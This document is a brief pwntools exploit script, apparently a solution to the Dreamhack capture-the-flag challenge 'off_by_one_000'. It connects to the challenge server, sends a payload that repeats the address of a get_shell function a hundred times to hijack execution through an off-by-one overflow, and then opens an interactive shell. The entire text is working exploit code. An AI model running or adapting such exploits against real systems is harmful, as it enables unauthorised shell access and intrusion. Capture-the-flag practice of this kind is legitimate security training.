from pwn import*

#p = process("./off_by_one_000")
p = remote('host3.dreamhack.games',21118)


get_shell = 0x080485db
payload = p32(get_shell)*0x64
p.send(payload)

p.interactive()
